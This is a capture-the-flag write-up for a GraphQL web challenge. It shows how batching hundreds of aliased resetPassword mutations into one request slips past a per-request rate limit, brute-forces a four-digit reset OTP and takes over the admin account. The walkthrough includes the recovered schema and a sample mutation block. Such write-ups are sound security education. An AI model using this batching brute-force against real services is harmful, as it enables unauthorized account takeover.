---
title: "Overgrowth"
category: "Web"
tags: []
solve_date: "2026-10-31"
language: "en"
---

# Overgrowth

## Challenge

A gardening-supply GraphQL API hides the flag behind an admin-only field. The password-reset OTP is only four digits and the endpoint's rate limit is applied per HTTP request, not per GraphQL operation. Sending hundreds of aliased `resetPassword` mutations in one GraphQL request brute-forces the OTP, gives admin access, and unlocks the `flag` field.

## Solution

### Step 1: Recover the schema and the decoy

`/graphql` runs Ariadne with introspection disabled. Validation errors reveal:

```graphql
type Query { flag: String, me: User, user(username: String!): User, products: [Product] }
type Mutation { login(username: String!, password: String!): Auth,
                requestPasswordReset(username: String!): Boolean,
                resetPassword(username: String!, token: String!, newPassword: String!): Boolean }
```

`user(username:"admin")` returns an `apiKey` containing the deliberate decoy:

```
hiCTF{n0t_the_flag_keep_diggin_this_is_just_an_apikey}
```

The real flag is the `flag` field and requires an authenticated admin session.

### Step 2: Brute-force the four-digit OTP with alias batching

`requestPasswordReset(username:"admin")` creates a short reset token. The endpoint blocks repeated reset attempts by HTTP request count, so put 250 aliased `resetPassword` mutations into a single request and walk the whole `0000`-`9999` keyspace in 40 requests:

```graphql
mutation {
  a0000: resetPassword(username:"admin", token:"0000", newPassword:"OvergrowthPwn2026!")
  a0001: resetPassword(username:"admin", token:"0001", newPassword:"OvergrowthPwn2026!")
  # ... 248 more aliases ...
}
```

The successful token was `8895`; retry when the endpoint returns HTTP 429.

### Step 3: Log in and read the flag

Log in with the new admin password, take the session token, and send it in the `Authorization` header (raw or `Bearer`) with:

```graphql
{ flag }
```

The service returns the flag.

## Result

```
hiCTF{graphql_al1as_batch1ng_brute_f0rces_the_0tp_fd61a0591a}
```

## Reproduction notes

The mutation block illustrates a batch; generate all 250 aliases with consecutive four-digit tokens when reproducing it. The token and session depend on the instance; a complete automated client is not included.
